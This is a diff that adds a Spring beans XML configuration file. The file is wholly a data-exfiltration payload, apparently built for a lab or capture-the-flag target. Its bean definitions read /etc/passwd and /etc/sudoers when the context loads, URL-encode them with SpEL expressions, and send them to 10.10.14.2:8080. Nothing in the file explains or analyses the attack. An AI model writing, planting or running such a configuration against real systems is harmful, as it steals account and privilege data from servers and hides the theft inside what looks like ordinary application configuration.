@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <!-- /etc/passwd -->
+    <bean id="passwdRes" class="org.springframework.core.io.FileSystemResource">
+        <constructor-arg value="/etc/passwd"/>
+    </bean>
+    <bean id="passwdStream" factory-bean="passwdRes" factory-method="getInputStream"/>
+    <bean id="passwdBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="passwdStream"/>
+    </bean>
+    <bean id="passwdContent" class="java.lang.String">
+        <constructor-arg ref="passwdBytes"/>
+    </bean>
+    <bean id="passwdUrl" class="java.net.URL" depends-on="passwdContent">
+        <constructor-arg value="#{'http://10.10.14.2:8080/passwd?v=' + T(java.net.URLEncoder).encode(@passwdContent,'UTF-8')}"/>
+    </bean>
+    <bean id="passwdReq" factory-bean="passwdUrl" factory-method="openStream" depends-on="passwdUrl"/>
+
+    <!-- /etc/sudoers -->
+    <bean id="sudoRes" class="org.springframework.core.io.FileSystemResource" depends-on="passwdReq">
+        <constructor-arg value="/etc/sudoers"/>
+    </bean>
+    <bean id="sudoStream" factory-bean="sudoRes" factory-method="getInputStream"/>
+    <bean id="sudoBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="sudoStream"/>
+    </bean>
+    <bean id="sudoContent" class="java.lang.String">
+        <constructor-arg ref="sudoBytes"/>
+    </bean>
+    <bean id="sudoUrl" class="java.net.URL" depends-on="sudoContent">
+        <constructor-arg value="#{'http://10.10.14.2:8080/sudoers?v=' + T(java.net.URLEncoder).encode(@sudoContent,'UTF-8')}"/>
+    </bean>
+    <bean id="sudoReq" factory-bean="sudoUrl" factory-method="openStream" depends-on="sudoUrl"/>
+
+</beans>
